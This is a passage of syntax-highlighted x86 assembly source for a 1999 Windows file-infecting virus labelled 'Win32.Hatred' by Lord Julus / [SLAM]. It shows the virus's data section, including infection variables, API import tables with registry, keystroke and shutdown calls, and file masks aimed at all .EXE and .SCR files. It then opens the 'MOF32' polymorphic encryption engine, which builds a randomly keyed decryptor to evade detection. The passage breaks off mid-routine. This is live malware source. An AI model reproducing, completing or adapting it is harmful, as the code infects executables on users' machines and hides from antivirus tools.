</span><span class="sc5">getmodulehandle</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleA"</span><span class="sc0">
</span><span class="sc5">getmodulehandlelen</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getmodulehandle</span><span class="sc0">
</span><span class="sc5">getprocaddress</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getprocaddresslen</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getprocaddress</span><span class="sc0">
</span><span class="sc5">scanneddirs</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">searchrec</span><span class="sc0">                          </span><span class="sc5">win32_find_data</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">searchfiles</span><span class="sc0">                        </span><span class="sc5">win32_find_data</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">handle1</span><span class="sc0">                         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maphandle</span><span class="sc0">                       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">searchhandle</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">signal</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">files</span><span class="sc0">                           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mapaddress</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">skip</span><span class="sc0">                            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">curdir</span><span class="sc0">                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">tempdir</span><span class="sc0">                         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FileTime</span><span class="sc0">                        </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">virussize</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">filealign</span><span class="sc0">                       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sectionalign</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">oldeip</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PEheader</span><span class="sc0">                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lastsection</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">deltahandle</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">smth</span><span class="sc0">                            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fileofs</span><span class="sc0">                         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fileattributes</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;------------------- Kernel32 APIS</span><span class="sc0">

</span><span class="sc5">k32_API_names</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ExitProcess"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalFree"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetDriveTypeA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"lstrlen"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FlushViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetLastError"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IsDebuggerPresent"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">


</span><span class="sc5">k32_API_addrs</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

</span><span class="sc5">_GetModuleHandleA</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ExitProcess</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GlobalAlloc</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GlobalFree</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetSystemDirectoryA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FindFirstFileA</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FindNextFileA</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetDriveTypeA</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FindClose</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CreateFileA</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CreateFileMappingA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_MapViewOfFile</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SetFilePointer</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SetEndOfFile</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetFileSize</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_lstrlen</span><span class="sc0">                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SetFileTime</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetFileTime</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetProcAddress</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FlushViewOfFile</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetLastError</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetSystemTime</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetFileAttributes</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SetFileAttributes</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_DeleteFileA</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_IsDebuggerPresent</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;------------------- Advapi32 APIS</span><span class="sc0">

</span><span class="sc5">a32_API_names</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RegCreateKeyExA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RegSetValueExA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RegQueryValueExA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RegOpenKeyExA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

</span><span class="sc5">a32_API_addrs</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

</span><span class="sc5">_RegCreateKeyExA</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_RegSetValueExA</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_RegQueryValueExA</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_RegOpenKeyExA</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;------------------- User32 APIs</span><span class="sc0">

</span><span class="sc5">u32_API_names</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetDC"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetAsyncKeyState"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ExitWindowsEx"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

</span><span class="sc5">u32_API_addrs</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

</span><span class="sc5">_MessageBoxA</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetDC</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetAsyncKeyState</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ExitWindowsEx</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;------------------- GDI32 APIs</span><span class="sc0">

</span><span class="sc5">g32_API_names</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"BitBlt"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

</span><span class="sc5">g32_API_addrs</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

</span><span class="sc5">_BitBlt</span><span class="sc0">                         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filemasks</span><span class="sc0">                       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GOAT*.EXE"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; for debug mode only</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GOAT*.SCR"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; goat files are searched</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filemasks</span><span class="sc0">                       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.EXE"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.SCR"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">copyright</span><span class="sc0">                       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win32.Hatred V.1.0              "</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"(C) 1999 by Lord Julus / [SLAM] "</span><span class="sc0">

</span><span class="sc1">;   ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;   ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄ¿                                                             ÚÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;   ³ ú ³ MúUúLúTúIúPúLúE  OúPúCúOúDúE  FúAúNúTúAúSúIúEúS  3ú2  BúIúT ³ ú ³</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÙ                                                             ÀÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄ¿                a polymorphic engine wrote by                ÚÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;   ³ ú ³                                                             ³ ú ³</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÙ                    LORD JULUS - 1999 (C)                    ÀÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;   ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   VERSION 2.5</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Parameters on entry:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         ESI = offset to code to encrypt</span><span class="sc0">
</span><span class="sc1">;         EDI = offset to the decryptor place</span><span class="sc0">
</span><span class="sc1">;         EBX = address of the offset of code to decrypt at runtime</span><span class="sc0">
</span><span class="sc1">;         ECX = length of code to decrypt</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Returns: nothing</span><span class="sc0">


</span><span class="sc5">MOF32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                       </span><span class="sc1">; Here is the actual poly engine</span><span class="sc0">
      </span><span class="sc6">pushad</span><span class="sc0">                          </span><span class="sc1">; body</span><span class="sc0">

</span><span class="sc1">; First let's encrypt the area that will be decrypted later</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Choose_random_registers</span><span class="sc0">    </span><span class="sc1">; choose the random registers to use</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codeaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">; save decryptor place</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">; save code in bytes</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; ebx points to the end</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">; minus 1 dword</span><span class="sc0">
      </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">; we work on dwords</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random32</span><span class="sc0">                   </span><span class="sc1">; get a random 32bit dword in EAX</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; which is the encryption key</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random32</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">keyvalue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the key increment</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                    </span><span class="sc1">; the static key.</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">; get a random value between 0-3</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">op1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the encryption method</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
